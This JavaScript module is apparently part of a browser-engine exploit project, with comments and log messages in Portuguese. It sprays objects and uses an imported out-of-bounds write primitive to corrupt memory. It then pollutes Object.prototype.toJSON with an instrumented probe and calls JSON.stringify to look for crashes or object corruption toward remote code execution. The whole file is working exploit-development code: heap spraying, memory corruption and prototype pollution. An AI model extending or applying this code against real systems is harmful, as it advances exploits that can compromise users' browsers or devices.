// js/script3/testInvestigateForInRCE.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean";
    }

    checkIntegrity(loggerFunc = logS3) {
        let checkOk = true;
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        // Adicione mais checagens se outros campos forem modificados
        return checkOk;
    }
    action() { return `ID:${this.id} acted`; }
}

// V4 Instrumented: Próximo da toJSON_ProbeGenericObject original, com logs e try-catch
export function toJSON_ForIn_V4_Instrumented() {
    const FNAME_toJSON = "toJSON_ForIn_V4_Instrumented";
    let iteration_count = 0;
    let error_in_loop = null;
    let props_payload = {};
    logS3(`[${FNAME_toJSON}] Entrando. this.id (se MyComplexObject): ${this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"}`, "info", FNAME_toJSON);

    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                logS3(`[${FNAME_toJSON}] Iter: ${iteration_count}, Prop: '${prop}'`, "info", FNAME_toJSON);

                if (Object.prototype.hasOwnProperty.call(this, prop)) {
                    logS3(`   [${FNAME_toJSON}] Own property. typeof this['${prop}']: ${typeof this[prop]}`, "info", FNAME_toJSON);
                    if (['id', 'value1', 'value2', 'marker', 'anotherProperty'].includes(prop) && typeof this[prop] !== 'function') {
                        try {
                            logS3(`     [${FNAME_toJSON}] Tentando: props_payload['${prop}'] = String(this['${prop}']).substring(0, 50);`, "info", FNAME_toJSON);
                            props_payload[prop] = String(this[prop]).substring(0, 50); // A OPERAÇÃO CRÍTICA
                            logS3(`       [${FNAME_toJSON}] Atribuição para props_payload['${prop}'] bem-sucedida.`, "good", FNAME_toJSON);
                        } catch (e_assign) {
                            logS3(`     [${FNAME_toJSON}] !!!! ERRO NA ATRIBUIÇÃO/CONVERSÃO para prop '${prop}' !!!!: ${e_assign.name} - ${e_assign.message}`, "critical", FNAME_toJSON);
                            error_in_loop = `AssignmentError on '${prop}': ${e_assign.name} - ${e_assign.message}`;
                            // Não quebrar o loop aqui, permitir que o RangeError externo (se houver) ocorra,
                            // ou que o loop continue se este erro for capturável e não fatal.
                        }
                    } else {
                         logS3(`     [${FNAME_toJSON}] Propriedade '${prop}' não processada (não está na lista ou é uma função).`, "info", FNAME_toJSON);
                    }
                } else {
                    logS3(`   [${FNAME_toJSON}] Propriedade '${prop}' não é 'own'.`, "info", FNAME_toJSON);
                }

                if (iteration_count > 100) { // Reduzido o safety break para logs mais curtos
                     logS3(`[${FNAME_toJSON}] Loop for...in V4_Instrumented excedeu 100 iterações. ID: ${this.id}. Interrompendo.`, "warn", FNAME_toJSON);
                    if (!error_in_loop) error_in_loop = "Max iterations (100) reached in for...in";
                    break;
                }
            }
        } else {
            logS3(`[${FNAME_toJSON}] 'this' não é um objeto ou é null. Type: ${typeof this}`, "warn", FNAME_toJSON);
        }
    } catch (e_outer_loop) { // Captura erros do próprio loop for...in
        error_in_loop = `OuterLoopError: ${e_outer_loop.name}: ${e_outer_loop.message}`;
        logS3(`[${FNAME_toJSON}] ERRO NO LOOP EXTERNO V4_Instrumented: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
    }
    logS3(`[${FNAME_toJSON}] Saindo. Iterações: ${iteration_count}. Erro interno: ${error_in_loop}. Payload keys: ${Object.keys(props_payload).join(';')}`, "info", FNAME_toJSON);
    return {
        toJSON_variant: FNAME_toJSON,
        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
        iterations: iteration_count,
        props_count_in_payload: Object.keys(props_payload).length,
        internal_error: error_in_loop // Renomeado para clareza
    };
}


// A função de teste principal adaptada para usar a V4_Instrumented
export async function executeRevisitForInRangeErrorTest() {
    const FNAME_TEST = `executeRevisitForInRangeErrorTest`;
    const toJSONFunctionName = "toJSON_ForIn_V4_Instrumented";
    logS3(`--- Iniciando Teste: Revisitando RangeError com ${toJSONFunctionName} ---`, "test", FNAME_TEST);
    document.title = `Revisit RangeError - ${toJSONFunctionName}`;

    const spray_count = 50;
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { setupError: e_spray };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed")};
    }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro objeto pulverizado (sprayed_objects[0]) com ${toJSONFunctionName}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result = {
        targetObjectId: null,
        integrityBefore: null,
        stringifyError: null,
        toJSONReturn: null,
        integrityAfter: null,
    };

    const target_obj = sprayed_objects[0];
    if (!target_obj) {
        logS3("ERRO: Nenhum objeto pulverizado para testar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: new Error("No sprayed objects") };
    }
    result.targetObjectId = target_obj.id;

    try {
        result.integrityBefore = target_obj.checkIntegrity(null); // Não logar daqui, a toJSON logará
        logS3(`   Integridade de ${target_obj.id} ANTES de JSON.stringify: ${result.integrityBefore}`, result.integrityBefore ? "good" : "warn", FNAME_TEST);

        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_ForIn_V4_Instrumented, // Usando a versão instrumentada
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        logS3(`   Chamando JSON.stringify(${target_obj.id}) usando ${toJSONFunctionName}...`, 'info', FNAME_TEST);
        document.title = `Stringify ${target_obj.id} - ${toJSONFunctionName}`;
        try {
            result.toJSONReturn = JSON.stringify(target_obj);
            logS3(`     JSON.stringify(${target_obj.id}) completou. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "info", FNAME_TEST);
            if (result.toJSONReturn && result.toJSONReturn.internal_error) {
                 logS3(`     ERRO INTERNO (reportado pela toJSON) na ${toJSONFunctionName}: ${result.toJSONReturn.internal_error}`, "warn", FNAME_TEST);
                 if (!result.stringifyError) result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.internal_error };
            }
        } catch (e_str) { // Captura o RangeError ou outros erros do stringify
            result.stringifyError = { name: e_str.name, message: e_str.message };
            logS3(`     !!!! ERRO AO STRINGIFY ${target_obj.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

        result.integrityAfter = target_obj.checkIntegrity(null);
        logS3(`   Integridade de ${target_obj.id} APÓS JSON.stringify: ${result.integrityAfter}`, result.integrityAfter ? "good" : "warn", FNAME_TEST);

    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do teste para ${target_obj.id}: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para ${target_obj.id}!`, "vuln", FNAME_TEST);
        document.title = `RangeError with ${toJSONFunctionName} on ${target_obj.id}!`;
    } else if (result.stringifyError) {
        logS3(`   Outro erro (${result.stringifyError.name}) ocorreu com ${toJSONFunctionName} para ${target_obj.id}.`, "error", FNAME_TEST);
    } else if (result.toJSONReturn && result.toJSONReturn.internal_error) {
        logS3(`   Erro interno capturado pela ${toJSONFunctionName} para ${target_obj.id}: ${result.toJSONReturn.internal_error}`, "warn", FNAME_TEST);
    } else if (!result.integrityBefore || !result.integrityAfter) {
        logS3(`   Falha de integridade detectada para ${target_obj.id} com ${toJSONFunctionName}.`, "warn", FNAME_TEST);
    } else {
        logS3(`   ${toJSONFunctionName} para ${target_obj.id} completou sem RangeError ou erro interno óbvio.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste com ${toJSONFunctionName} (Revisitando RangeError) CONCLUÍDO ---`, "subtest", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    return result;
}
